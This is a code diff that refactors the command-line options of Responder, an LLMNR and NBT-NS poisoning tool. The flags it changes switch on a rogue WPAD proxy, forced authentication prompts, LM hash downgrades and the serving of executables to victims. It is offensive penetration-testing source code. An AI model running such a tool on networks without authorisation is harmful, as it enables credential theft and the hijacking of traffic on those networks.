@@ -23,28 +23,28 @@ from odict import OrderedDict
 from socket import inet_aton
 from random import randrange
 
-parser = optparse.OptionParser(usage='python %prog -i 10.20.30.40 -b On -r On',
+parser = optparse.OptionParser(usage='python %prog -i 10.20.30.40 -w -r -f\nor:\npython %prog -i 10.20.30.40 -wrf',
                                prog=sys.argv[0],
                                )
-parser.add_option('-A','--analyze', action="store_true", help="Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning anything.", metavar="10.20.30.40",dest="Analyse")
+parser.add_option('-A','--analyze', action="store_true", help="Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning anything.", dest="Analyse")
 
 parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")
 
 parser.add_option('-I','--interface', action="store", help="Network interface to use", metavar="eth0", dest="INTERFACE", default="Not set")
 
-parser.add_option('-b', '--basic',action="store", help="Set this to On if you want to return a Basic HTTP authentication. Off will return an NTLM authentication.This option is mandatory.", metavar="Off",dest="Basic", choices=['On','on','off','Off'], default="Off")
+parser.add_option('-b', '--basic',action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned.", dest="Basic", default=False)
 
-parser.add_option('-r', '--wredir',action="store", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' will). Default value is therefore set to Off", metavar="Off",dest="Wredirect", choices=['On','on','off','Off'], default="Off")
+parser.add_option('-r', '--wredir',action="store_true", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' would). Default value is therefore set to False", dest="Wredirect", default=False)
 
-parser.add_option('-d', '--NBTNSdomain',action="store", help="Set this to enable answers for netbios domain suffix queries. Answering to domain will likely break stuff on the network (like classics 'nbns spoofer' will). Default value is therefore set to Off", metavar="Off",dest="NBTNSDomain", choices=['On','on','off','Off'], default="Off")
+parser.add_option('-d', '--NBTNSdomain',action="store_true", help="Set this to enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network (like a classic 'nbns spoofer' would). Default value is therefore set to False",dest="NBTNSDomain", default=False)
 
-parser.add_option('-f','--fingerprint', action="store", dest="Finger", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", metavar="Off", choices=['On','on','off','Off'], default="Off")
+parser.add_option('-f','--fingerprint', action="store_true", dest="Finger", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", default=False)
 
-parser.add_option('-w','--wpad', action="store", dest="WPAD_On_Off", help = "Set this to On or Off to start/stop the WPAD rogue proxy server. Default value is Off", metavar="On", choices=['On','on','off','Off'], default="Off")
+parser.add_option('-w','--wpad', action="store_true", dest="WPAD_On_Off", help = "Set this to start the WPAD rogue proxy server. Default value is False", default=False)
 
-parser.add_option('-F','--ForceWpadAuth', action="store", dest="Force_WPAD_Auth", help = "Set this to On or Off to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Default value is Off", metavar="Off", choices=['On','on','off','Off'], default="Off")
+parser.add_option('-F','--ForceWpadAuth', action="store_true", dest="Force_WPAD_Auth", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False",default=False)
 
-parser.add_option('--lm',action="store", help="Set this to On if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is Off", metavar="Off",dest="LM_On_Off", choices=['On','on','off','Off'], default="Off")
+parser.add_option('--lm',action="store_true", help="Set this if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is False", dest="LM_On_Off", default=False)
 
 parser.add_option('-v',action="store_true", help="More verbose",dest="Verbose")
 
@@ -85,15 +85,15 @@ RespondToName = config.get('Responder Core', 'RespondToName').strip()
 RespondToName.split(",")
 #Cli options.
 OURIP = options.OURIP
-LM_On_Off = options.LM_On_Off.upper()
-WPAD_On_Off = options.WPAD_On_Off.upper()
-Wredirect = options.Wredirect.upper()
-NBTNSDomain = options.NBTNSDomain.upper()
-Basic = options.Basic.upper()
-Finger_On_Off = options.Finger.upper()
+LM_On_Off = options.LM_On_Off
+WPAD_On_Off = options.WPAD_On_Off
+Wredirect = options.Wredirect
+NBTNSDomain = options.NBTNSDomain
+Basic = options.Basic
+Finger_On_Off = options.Finger
 INTERFACE = options.INTERFACE
 Verbose = options.Verbose
-Force_WPAD_Auth = options.Force_WPAD_Auth.upper()
+Force_WPAD_Auth = options.Force_WPAD_Auth
 AnalyzeMode = options.Analyse
 
 if INTERFACE != "Not set":
@@ -203,7 +203,7 @@ Challenge = ""
 for i in range(0,len(NumChal),2):
     Challenge += NumChal[i:i+2].decode("hex")
 
-Show_Help("[+]NBT-NS, LLMNR & MDNS responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nResponder is bound to this interface:%s\nChallenge set is:%s\nWPAD Proxy Server is:%s\nWPAD script loaded:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is:%s\nKerberos Server is:%s\nSQL Server is:%s\nFTP Server is:%s\nIMAP Server is:%s\nPOP3 Server is:%s\nSMTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\nServing Executable via HTTP&WPAD is:%s\nAlways Serving a Specific File via HTTP&WPAD is:%s\n\n"%(BIND_TO_Interface, NumChal,WPAD_On_Off,WPAD_Script,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,Krb_On_Off,SQL_On_Off,FTP_On_Off,IMAP_On_Off,POP_On_Off,SMTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
+Show_Help("[+]NBT-NS, LLMNR & MDNS responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nResponder is bound to this interface: %s\nChallenge set: %s\nWPAD Proxy Server: %s\nWPAD script loaded:  %s\nHTTP Server: %s\nHTTPS Server: %s\nSMB Server: %s\nSMB LM support: %s\nKerberos Server: %s\nSQL Server: %s\nFTP Server: %s\nIMAP Server: %s\nPOP3 Server: %s\nSMTP Server: %s\nDNS Server: %s\nLDAP Server: %s\nFingerPrint hosts: %s\nServing Executable via HTTP&WPAD: %s\nAlways Serving a Specific File via HTTP&WPAD: %s\n\n"%(BIND_TO_Interface, NumChal,WPAD_On_Off,WPAD_Script,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,Krb_On_Off,SQL_On_Off,FTP_On_Off,IMAP_On_Off,POP_On_Off,SMTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
 
 if AnalyzeMode:
    print '[+]Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.\n'
@@ -225,9 +225,9 @@ class Packet():
 
 #Function name self-explanatory
 def Is_Finger_On(Finger_On_Off):
-    if Finger_On_Off == "ON":
+    if Finger_On_Off == True:
        return True
-    if Finger_On_Off == "OFF":
+    if Finger_On_Off == False:
        return False
 
 def RespondToSpecificHost(RespondTo):
@@ -306,11 +306,11 @@ def Validate_NBT_NS(data,Wredirect):
     if NBT_NS_Role(data[43:46]) == "File Server Service.":
        return True
 
-    if NBTNSDomain == "ON":
+    if NBTNSDomain == True:
        if NBT_NS_Role(data[43:46]) == "Domain controller service. This name is a domain controller.":
           return True
 
-    if Wredirect == "ON":
+    if Wredirect == True:
        if NBT_NS_Role(data[43:46]) == "Workstation/Redirector Service.":
           return True
 
@@ -1600,16 +1600,16 @@ def WpadCustom(data,client):
        return False
 
 def WpadForcedAuth(Force_WPAD_Auth):
-    if Force_WPAD_Auth == "ON":
+    if Force_WPAD_Auth == True:
        return True
-    else:
+    if Force_WPAD_Auth == False:
        return False
 
 # Function used to check if we answer with a Basic or NTLM auth. 
 def Basic_Ntlm(Basic):
-    if Basic == "ON":
+    if Basic == True:
        return IIS_Basic_401_Ans()
-    if Basic == "OFF":
+    else:
        return IIS_Auth_401_Ans()
 
 def ServeEXE(data,client, Filename):
@@ -1733,11 +1733,11 @@ class HTTP(BaseRequestHandler):
 
     def handle(self):
         try:
-           while True:
+           while True:  
               self.request.settimeout(1)
               data = self.request.recv(8092)
               buff = WpadCustom(data,self.client_address[0])
-              if buff and Force_WPAD_Auth == "OFF":
+              if buff and WpadForcedAuth(Force_WPAD_Auth) == False:
                  Message = "[+]WPAD (no auth) file sent to: %s"%(self.client_address[0])
                  if Verbose:
                    print Message
@@ -1748,7 +1748,6 @@ class HTTP(BaseRequestHandler):
                  self.request.send(buffer0)
         except Exception:
            pass#No need to be verbose..
-           self.request.close()
 
 
 ##################################################################################
@@ -2313,15 +2312,15 @@ def Is_HTTPS_On(SSL_On_Off):
 
 #Function name self-explanatory
 def Is_WPAD_On(on_off):
-    if on_off == "ON":
+    if on_off == True:
        return thread.start_new(serve_thread_tcp,('', 3141,ProxyHandler))
-    if on_off == "OFF":
+    if on_off == False:
        return False
 
 #Function name self-explanatory
 def Is_SMB_On(SMB_On_Off):
     if SMB_On_Off == "ON":
-       if LM_On_Off == "ON":
+       if LM_On_Off == True:
           return thread.start_new(serve_thread_tcp, ('', 445,SMB1LM)),thread.start_new(serve_thread_tcp,('', 139,SMB1LM))
        else:
           return thread.start_new(serve_thread_tcp, ('', 445,SMB1)),thread.start_new(serve_thread_tcp,('', 139,SMB1))
